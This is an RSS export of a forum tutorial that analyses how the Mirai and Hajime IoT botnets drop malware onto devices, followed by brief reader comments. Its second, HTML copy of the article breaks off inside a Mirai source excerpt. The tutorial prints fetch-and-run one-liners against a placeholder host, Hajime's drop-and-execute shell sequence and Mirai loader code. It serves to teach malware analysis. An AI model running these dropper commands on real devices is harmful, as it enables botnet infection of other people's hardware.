<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>IoT Malware Droppers (Mirai and Hajime)</title>
    <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966</link>
    <description>Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found.
#### Author Assigned Level: Newbie
#### Community Assigned Level:
[poll type=regular]
* Newbie
* Wannabe
* Hacker
* Wizard
* Guru
[/poll]

#### Required Skills
To easily follow this paper you should have the following skills:

* Basic shell scripting
* Basic knowledge of C programming
* Basic knowledge of network programming 
* Basic Knowledge of ELFs (no, knowing who Legolas is, is not enough)
 

#### Disclaimer 
This paper is for educational purpose. 

-----
# Overview of an IoT malware
 IoT malware, specially botnets have recently become quite popular. Mirai, Hajime, LuaBot,... are some examples of malware attacking embedded devices like modems, routers or different IoT thingies connected to the Internet.

Overall, there is nothing really special about the infection process. Most of those malwares do not even use an exploit. The infection process relies in the fact that many of those embedded devices are never reconfigured and, therefore, they still use a well-known default configuration. In this scenario, infecting the device is just a matter of trying all known user names and passwords until one just works.

However, in general, the attacker only have access to a telnet server in the device that gives access to a very constrained shell, usually a shrink version of `busybox`. What this means is that you will not find tools like `ftp`, `wget` or `curl`. For this reason the _dropper_ may have to do some tricks to get the device infected.

# Fine, but... what is a dropper again?
So, the thing usually goes like this.

* The attacker launches a scan for vulnerable devices (devices enabling root accesses using default credentials publicly available)
* For each vulnerable device, the attacker will start a root session (usually via telnet) to try to install the malware in the device.
* The malware is executed and the device compromised.

The program/script used to get the malware in the device and install it is some times called dropper... because it allows the attacker to drop the malware in the device :)

Depending on the available tools in the target device, the dropper can be something as easy as:

    wget -q http://evil-hax0r.com/m.sh -O - | sh
    curl -s http://evil-hax0r.com/m.sh | sh
    lynx -dump http://evil-hax0r.com/m.sh | sh

Or may require to feed the data through the already established connection... In a sense, something similar to what happen when using a &quot;Rubber Ducky&quot;... Only a terminal is available and we can just _type_ text on it.

# Anatomy of a dropper
OK, the dropper goal is to get some malware  into the device and start it up. This sounds very straight forward but it actually requires a few actions in order to succeed.

* The first thing to do is to find a folder in the device with write and execution permissions. Usually the `/tmp` folder will fulfill those requirements but it is better to check what is available just in case.
* The second thing to do is to figure out the architecture of the device so the proper binary will be copied. Malware targeting embedded device usually supports a few architectures to increase its chances to spread along the network. You will usually find a few ARM architectures, MIPS big and little endian and probably x86 32bis and 64bits
* Finally it has to manage to transfer that file to the device and run it.

&gt; _Note: Sophisticated droppers do more things as checking if the machine has already been infected, remove other malwares, check for RE environments (VMs, sandboxes,...). The steps above are, let&#39;s say, the very minimum for a crappy IoT malware._

Let&#39;s go one by one through these different steps... but first.

# Parsing the commands
So, the attacker is running a program intended to remotely infect devices. It opens a socket to a telnet port in some device and it starts to `send` and `recv` data through that socket. The data interchanged through that socket is what you will type and see if you manually connect to the device.

But, in order to process, specially the responses from the device, it will be useful to get some mark indicating that our command has been completed. A trick used by many malwares is to use a non-existent busybox applet to signal the completion of every command issued. You will see commands like this:

```
nc; wget; /bin/busybox RANDOM_TAG
```

The command above is used by the malware Hajime to check if the current busybox has the applets `nc` and `wget`. For each unknown command, busybox will reply with:


    COMMAND: applet not found

This way, if the previous command produces the following input:

    nc: applet not found
    wget: applet not found
    RANDOM_TAG: applet not found

That means that `nc` and `wget` are not available. The `RANDOM_TAG: applet not found` string will indicate the end of the output and the parse just need to look for that string before issuing the next command.

# Finding a suitable folder
As mentioned above, this is the first step so the dropper can drop files in the device. The usual way to do this is checking the output of `cat /proc/mounts` and check for the string `rw`. You can try that command in your Linux box just right now.

Note that it is very unlikely that `grep` is available in any of those embedded devices so `cat /proc/mounts | grep rw` may not work. Instead, the dropper will read the complete output from the `cat` command and look itself for the string.

Mirai  and Hajime use this technique to find a suitable place to store and run files.

Let&#39;s take a look to the command that Mirai executes (

https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L338




Have you spotted that `TOKEN_QUERY` at the end?. Sure you did. Now head to this header file (https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/headers/includes.h) and you will find this definitions:

```
#define TOKEN_QUERY     &quot;/bin/busybox ECCHI&quot;
#define TOKEN_RESPONSE  &quot;ECCHI: applet not found&quot;
```

Good... now you know what does that mean... don&#39;t you?


# Figuring out the architecture
Now, the dropper has to figure out the architecture so it can download the right binary for the device it is trying to infect. In general you will not find tools like `file` or `readelf` in an embedded device, so you may need to figure out the architecture by other means.

Yes, you may have to parse the ELF header!!!!

To do that these droppers usually `cat` a binary that they know it exists... The choice for most of then is `/bin/echo`. For instance check the Mirai code (you can see how Hajime does it in the report linked in the resources section at the end).

https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L369

Well I haven&#39;t said that, but, the Mirai dropper implements the telnet access as a state machine. You can see in the snippet above, how the state is set for the next loop (`TELNET_DETECT_ARCH`), then the command is send to the server and the loop iteration finish. In the next iteration the case `TELNET_DETECT_ARCH` will be fired and the output from `cat` read and processed. 

https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L383

You can find the code to check the architecture here 

https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/connection.c#L465

As I said, what Mirai does is parse the ELF header and check the `e_machine` and `e_ident` fields to figure out the architecture. It cast a pointer to the buffer read from the socket to an `Elf_hdr` struct and then it just access the fields...

Take a look to the code... Mirai actually does an extra check for ARM subtypes.

# How to transfer the files
Now the dropper has to figure out what means are available to actually transfer the malware to the device.

For instance Mirai, checks for `wget`, `tftp` and `echo`, using the applet not found technique we described above. You can take a look to all the details here 

https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L431

When one of those tools are available, then we are done, but sometimes none of them can be found, and techniques like the `echo` method used by Mirai are needed.

## Transferring files the hard way
So, how does this `echo` method works. Well this is simpler that it may look like. It just `echoes` a hex string to a file. Something like this:

```
echo -ne &quot;\x7f\x45\x4c\x46\x...&quot; &gt; malware
```

This, however only works with very small binaries. For bigger binaries you may have to split the `echo` command in many pieces and use the `&gt;&gt;` append redirection to append each piece to the result file.

## The Hajime case
The Hajime case is very interesting as it does a kind of two stages dropping [check this](https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf) for details.

It first deploys a very small ELF binary. This binary is the one that will download the real malware. It connects to a pre-defined server and outputs to `stdout` whatever it receives from the server... the real malware. The way it does this is interesting. After dumping the first binary (the small one) using the `echo` technique, it runs the following shell commands:

``` 
cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI
```

So `.s` is the file where the small ELF was dumped using `echo`. This file was created previously and it has already got execution permissions. Knowing this, the shell code above does the following:

* `cp .s .i` copies the small ELF (the one that will download the real malware) stored in `.s` to `.i`. As you know, all files starting with a dot are hidden (you have to use the flag `-a` with `ls` to see them). So this makes a copy of the binary... __preserving the permissions__. This basically means that we do not have to do `chmod 777 .i` after downloading the final malware
* `&gt;.i `. This is actually truncating the file. In other words, this is a way to remove all the content of the file and set its size to 0... but __keeping the file permissions__. So right now, we have an empty file with execution permissions
* `./.s&gt;.i` this is more obvious. Now it runs the downloader (the small ELF file created with `echo`) and redirects its standard output to the __empty but executable__ file `.i`. As we said above, this downloader connects to a server and dumps to `stdout` whatever the server sends back. Think about it as a minimal `wget` command.
* `./.i;rm .s` and finally the just downloaded malware is executed and the downloader removed from the disk. The main malware is likely a daemon, so, once started (`./.i`), it just returns the control to the shell that can then delete the downloader.

And from this point on that device is compromised.

# Conclusions
Well, this is it for today. Hope you enjoy the reading and if this was a new topic for you that you have learn something. Please be free to share your comments and ask your questions in the comments below.

### Resources
The contents of this paper is based on the information provided by the following sources:

Mirai Source Code: https://github.com/jgamblin/Mirai-Source-Code/tree/master/loader/src
Hajime Analysis: https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf</description>
    
    <lastBuildDate>Fri, 22 Dec 2017 00:42:12 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/12</link>
        <pubDate>Wed, 27 Dec 2017 18:42:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-12</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/11</link>
        <pubDate>Fri, 22 Dec 2017 00:42:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-11</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/10</link>
        <pubDate>Thu, 26 Oct 2017 20:29:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-10</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[witch]]></dc:creator>
        <description><![CDATA[
            <p>Preach it! IoT hacking is one of my favorite things at the moment! I’d love to get a semi-private group of people together for the purposes of embedded device hacking, mutual learning, sharing our finds, etc.  if anyone is interested.</p>
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/8</link>
        <pubDate>Thu, 26 Oct 2017 14:21:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-8</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[sabina]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for the write-up, really great article. Had a fun time reading through it.</p>
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/7</link>
        <pubDate>Sun, 14 May 2017 07:28:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-7</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[Valkyr]]></dc:creator>
        <description><![CDATA[
            <p>great article. Especially how you made it readable for even people with almost 0 knowledge</p>
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/6</link>
        <pubDate>Fri, 05 May 2017 06:39:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-6</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>Nice article <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> . I was briefly looking at Hajime in the last days so it’s nice to get a ‘summary’ and some explanation for it here.<br>
Also I can agree with pry it’s easy to follow through until the end</p>
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/5</link>
        <pubDate>Fri, 05 May 2017 05:47:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-5</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I have really enjoyed this read. It’s a nice and relaxed reading, and helps you to really understand the kind of things malware developers have to think about.</p>
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/4</link>
        <pubDate>Fri, 05 May 2017 05:25:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-4</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for spotting that… You are completely right.<br>
I will fix it!</p>
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/3</link>
        <pubDate>Thu, 04 May 2017 21:57:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-3</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>I really enjoyed reading this analysis on some seriously hyped malware.</p>
<p>One little thing:</p>
<aside class="quote no-group quote-modified" data-username="0x00pf" data-post="1" data-topic="1966">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>you have to use the flag -l with ls to see them</p>
</blockquote>
</aside>
<p>It’s the <code>-a</code> flag.</p>
          <p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/2</link>
        <pubDate>Thu, 04 May 2017 21:55:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1966-2</guid>
        <source url="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966.rss">IoT Malware Droppers (Mirai and Hajime)</source>
      </item>
      <item>
        <title>IoT Malware Droppers (Mirai and Hajime)</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found.</p>
<h4>Author Assigned Level: Newbie</h4>
<h4>Community Assigned Level:</h4>
<p><a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966/1">Click to view the poll.</a></p>
<h4>Required Skills</h4>
<p>To easily follow this paper you should have the following skills:</p>
<ul>
<li>Basic shell scripting</li>
<li>Basic knowledge of C programming</li>
<li>Basic knowledge of network programming</li>
<li>Basic Knowledge of ELFs (no, knowing who Legolas is, is not enough)</li>
</ul>
<h4>Disclaimer</h4>
<p>This paper is for educational purpose.</p>
<hr>
<h1>Overview of an IoT malware</h1>
<p>IoT malware, specially botnets have recently become quite popular. Mirai, Hajime, LuaBot,… are some examples of malware attacking embedded devices like modems, routers or different IoT thingies connected to the Internet.</p>
<p>Overall, there is nothing really special about the infection process. Most of those malwares do not even use an exploit. The infection process relies in the fact that many of those embedded devices are never reconfigured and, therefore, they still use a well-known default configuration. In this scenario, infecting the device is just a matter of trying all known user names and passwords until one just works.</p>
<p>However, in general, the attacker only have access to a telnet server in the device that gives access to a very constrained shell, usually a shrink version of <code>busybox</code>. What this means is that you will not find tools like <code>ftp</code>, <code>wget</code> or <code>curl</code>. For this reason the <em>dropper</em> may have to do some tricks to get the device infected.</p>
<h1>Fine, but… what is a dropper again?</h1>
<p>So, the thing usually goes like this.</p>
<ul>
<li>The attacker launches a scan for vulnerable devices (devices enabling root accesses using default credentials publicly available)</li>
<li>For each vulnerable device, the attacker will start a root session (usually via telnet) to try to install the malware in the device.</li>
<li>The malware is executed and the device compromised.</li>
</ul>
<p>The program/script used to get the malware in the device and install it is some times called dropper… because it allows the attacker to drop the malware in the device <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Depending on the available tools in the target device, the dropper can be something as easy as:</p>
<pre><code>wget -q http://evil-hax0r.com/m.sh -O - | sh
curl -s http://evil-hax0r.com/m.sh | sh
lynx -dump http://evil-hax0r.com/m.sh | sh
</code></pre>
<p>Or may require to feed the data through the already established connection… In a sense, something similar to what happen when using a “Rubber Ducky”… Only a terminal is available and we can just <em>type</em> text on it.</p>
<h1>Anatomy of a dropper</h1>
<p>OK, the dropper goal is to get some malware  into the device and start it up. This sounds very straight forward but it actually requires a few actions in order to succeed.</p>
<ul>
<li>The first thing to do is to find a folder in the device with write and execution permissions. Usually the <code>/tmp</code> folder will fulfill those requirements but it is better to check what is available just in case.</li>
<li>The second thing to do is to figure out the architecture of the device so the proper binary will be copied. Malware targeting embedded device usually supports a few architectures to increase its chances to spread along the network. You will usually find a few ARM architectures, MIPS big and little endian and probably x86 32bis and 64bits</li>
<li>Finally it has to manage to transfer that file to the device and run it.</li>
</ul>
<blockquote>
<p><em>Note: Sophisticated droppers do more things as checking if the machine has already been infected, remove other malwares, check for RE environments (VMs, sandboxes,…). The steps above are, let’s say, the very minimum for a crappy IoT malware.</em></p>
</blockquote>
<p>Let’s go one by one through these different steps… but first.</p>
<h1>Parsing the commands</h1>
<p>So, the attacker is running a program intended to remotely infect devices. It opens a socket to a telnet port in some device and it starts to <code>send</code> and <code>recv</code> data through that socket. The data interchanged through that socket is what you will type and see if you manually connect to the device.</p>
<p>But, in order to process, specially the responses from the device, it will be useful to get some mark indicating that our command has been completed. A trick used by many malwares is to use a non-existent busybox applet to signal the completion of every command issued. You will see commands like this:</p>
<pre><code class="lang-auto">nc; wget; /bin/busybox RANDOM_TAG
</code></pre>
<p>The command above is used by the malware Hajime to check if the current busybox has the applets <code>nc</code> and <code>wget</code>. For each unknown command, busybox will reply with:</p>
<pre><code>COMMAND: applet not found
</code></pre>
<p>This way, if the previous command produces the following input:</p>
<pre><code>nc: applet not found
wget: applet not found
RANDOM_TAG: applet not found
</code></pre>
<p>That means that <code>nc</code> and <code>wget</code> are not available. The <code>RANDOM_TAG: applet not found</code> string will indicate the end of the output and the parse just need to look for that string before issuing the next command.</p>
<h1>Finding a suitable folder</h1>
<p>As mentioned above, this is the first step so the dropper can drop files in the device. The usual way to do this is checking the output of <code>cat /proc/mounts</code> and check for the string <code>rw</code>. You can try that command in your Linux box just right now.</p>
<p>Note that it is very unlikely that <code>grep</code> is available in any of those embedded devices so <code>cat /proc/mounts | grep rw</code> may not work. Instead, the dropper will read the complete output from the <code>cat</code> command and look itself for the string.</p>
<p>Mirai  and Hajime use this technique to find a suitable place to store and run files.</p>
<p>Let’s take a look to the command that Mirai executes (</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L338" target="_blank" rel="nofollow noopener">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L338" target="_blank" rel="nofollow noopener">jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L338</a></h4>
<pre class="onebox"><code class="lang-c"><ol class="start lines" start="328" style="counter-reset: li-counter 327 ;">
<li>#ifdef DEBUG</li>
<li>                            printf("[FD%d] Succesfully logged in\n", ev-&gt;data.fd);</li>
<li>#endif</li>
<li>                            util_sockprintf(conn-&gt;fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");</li>
<li>                            conn-&gt;state_telnet = TELNET_PARSE_PS;</li>
<li>                        }</li>
<li>                        break;</li>
<li>                    case TELNET_PARSE_PS:</li>
<li>                        if ((consumed = connection_consume_psoutput(conn)) &gt; 0)</li>
<li>                        {</li>
<li class="selected">                            util_sockprintf(conn-&gt;fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");</li>
<li>                            conn-&gt;state_telnet = TELNET_PARSE_MOUNTS;</li>
<li>                        }</li>
<li>                        break;</li>
<li>                    case TELNET_PARSE_MOUNTS:</li>
<li>                        consumed = connection_consume_mounts(conn);</li>
<li>                        if (consumed)</li>
<li>                            conn-&gt;state_telnet = TELNET_READ_WRITEABLE;</li>
<li>                        break;</li>
<li>                    case TELNET_READ_WRITEABLE:</li>
<li>                        consumed = connection_consume_written_dirs(conn);</li>
</ol></code></pre>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Have you spotted that <code>TOKEN_QUERY</code> at the end?. Sure you did. Now head to this header file (<a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/headers/includes.h" rel="nofollow noopener">https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/headers/includes.h</a>) and you will find this definitions:</p>
<pre><code class="lang-auto">#define TOKEN_QUERY     "/bin/busybox ECCHI"
#define TOKEN_RESPONSE  "ECCHI: applet not found"
</code></pre>
<p>Good… now you know what does that mean… don’t you?</p>
<h1>Figuring out the architecture</h1>
<p>Now, the dropper has to figure out the architecture so it can download the right binary for the device it is trying to infect. In general you will not find tools like <code>file</code> or <code>readelf</code> in an embedded device, so you may need to figure out the architecture by other means.</p>
<p>Yes, you may have to parse the ELF header!!!</p>
<p>To do that these droppers usually <code>cat</code> a binary that they know it exists… The choice for most of then is <code>/bin/echo</code>. For instance check the Mirai code (you can see how Hajime does it in the report linked in the resources section at the end).</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L369" target="_blank" rel="nofollow noopener">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L369" target="_blank" rel="nofollow noopener">jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L369</a></h4>
<pre class="onebox"><code class="lang-c"><ol class="start lines" start="359" style="counter-reset: li-counter 358 ;">
<li>                        break;</li>
<li>                    case TELNET_COPY_ECHO:</li>
<li>                        consumed = connection_consume_copy_op(conn);</li>
<li>                        if (consumed)</li>
<li>                        {</li>
<li>#ifdef DEBUG</li>
<li>                            printf("[FD%d] Finished copying /bin/echo to cwd\n", conn-&gt;fd);</li>
<li>#endif</li>
<li>                            if (!conn-&gt;info.has_arch)</li>
<li>                            {</li>
<li class="selected">                                conn-&gt;state_telnet = TELNET_DETECT_ARCH;</li>
<li>                                conn-&gt;timeout = 120;</li>
<li>                                // DO NOT COMBINE THESE</li>
<li>                                util_sockprintf(conn-&gt;fd, "/bin/busybox cat /bin/echo\r\n");</li>
<li>                                util_sockprintf(conn-&gt;fd, TOKEN_QUERY "\r\n");</li>
<li>                            }</li>
<li>                            else</li>
<li>                            {</li>
<li>                                conn-&gt;state_telnet = TELNET_UPLOAD_METHODS;</li>
<li>                                conn-&gt;timeout = 15;</li>
<li>                                util_sockprintf(conn-&gt;fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");</li>
</ol></code></pre>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Well I haven’t said that, but, the Mirai dropper implements the telnet access as a state machine. You can see in the snippet above, how the state is set for the next loop (<code>TELNET_DETECT_ARCH</code>), then the command is send to the server and the loop iteration finish. In the next iteration the case <code>TELNET_DETECT_ARCH</code> will be fired and the output from <code>cat</code> read and processed.</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L383" target="_blank" rel="nofollow noopener">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L383" target="_blank" rel="nofollow noopener">jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L383</a></h4>
<pre class="onebox"><code class="lang-c"><ol class="start lines" start="373" style="counter-reset: li-counter 372 ;">
<li>                                util_sockprintf(conn-&gt;fd, TOKEN_QUERY "\r\n");</li>
<li>                            }</li>
<li>                            else</li>
<li>                            {</li>
<li>                                conn-&gt;state_telnet = TELNET_UPLOAD_METHODS;</li>
<li>                                conn-&gt;timeout = 15;</li>
<li>                                util_sockprintf(conn-&gt;fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");</li>
<li>                            }</li>
<li>                        }</li>
<li>                        break;</li>
<li class="selected">                    case TELNET_DETECT_ARCH:</li>
<li>                        consumed = connection_consume_arch(conn);</li>
<li>                        if (consumed)</li>
<li>                        {</li>
<li>                            conn-&gt;timeout = 15;</li>
<li>                            if ((conn-&gt;bin = binary_get_by_arch(conn-&gt;info.arch)) == NULL)</li>
<li>                            {</li>
<li>#ifdef DEBUG</li>
<li>                                printf("[FD%d] Cannot determine architecture\n", conn-&gt;fd);</li>
<li>#endif</li>
<li>                                connection_close(conn);</li>
</ol></code></pre>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>You can find the code to check the architecture here</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/connection.c#L465" target="_blank" rel="nofollow noopener">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/connection.c#L465" target="_blank" rel="nofollow noopener">jgamblin/Mirai-Source-Code/blob/master/loader/src/connection.c#L465</a></h4>
<pre class="onebox"><code class="lang-c"><ol class="start lines" start="455" style="counter-reset: li-counter 454 ;">
<li>
</li><li>int connection_consume_copy_op(struct connection *conn)</li>
<li>{</li>
<li>    int offset = util_memsearch(conn-&gt;rdbuf, conn-&gt;rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));</li>
<li>
</li><li>    if (offset == -1)</li>
<li>        return 0;</li>
<li>    return offset;</li>
<li>}</li>
<li>
</li><li class="selected">int connection_consume_arch(struct connection *conn)</li>
<li>{</li>
<li>    if (!conn-&gt;info.has_arch)</li>
<li>    {</li>
<li>        struct elf_hdr *ehdr;</li>
<li>        int elf_start_pos;</li>
<li>
</li><li>        if ((elf_start_pos = util_memsearch(conn-&gt;rdbuf, conn-&gt;rdbuf_pos, "ELF", 3)) == -1)</li>
<li>            return 0;</li>
<li>        elf_start_pos -= 4; // Go back ELF</li>
<li>
</li></ol></code></pre>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>As I said, what Mirai does is parse the ELF header and check the <code>e_machine</code> and <code>e_ident</code> fields to figure out the architecture. It cast a pointer to the buffer read from the socket to an <code>Elf_hdr</code> struct and then it just access the fields…</p>
<p>Take a look to the code… Mirai actually does an extra check for ARM subtypes.</p>
<h1>How to transfer the files</h1>
<p>Now the dropper has to figure out what means are available to actually transfer the malware to the device.</p>
<p>For instance Mirai, checks for <code>wget</code>, <code>tftp</code> and <code>echo</code>, using the applet not found technique we described above. You can take a look to all the details here</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L431" target="_blank" rel="nofollow noopener">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L431" target="_blank" rel="nofollow noopener">jgamblin/Mirai-Source-Code/blob/master/loader/src/server.c#L431</a></h4>
<pre class="onebox"><code class="lang-c"><ol class="start lines" start="421" style="counter-reset: li-counter 420 ;">
<li>                                printf("[FD%d] We do not have an ARMv7 binary, so we will try using default ARM\n", conn-&gt;fd);</li>
<li>#endif</li>
<li>                            }</li>
<li>                            else</li>
<li>                                conn-&gt;bin = bin;</li>
<li>
</li><li>                            util_sockprintf(conn-&gt;fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");</li>
<li>                            conn-&gt;state_telnet = TELNET_UPLOAD_METHODS;</li>
<li>                        }</li>
<li>                        break;</li>
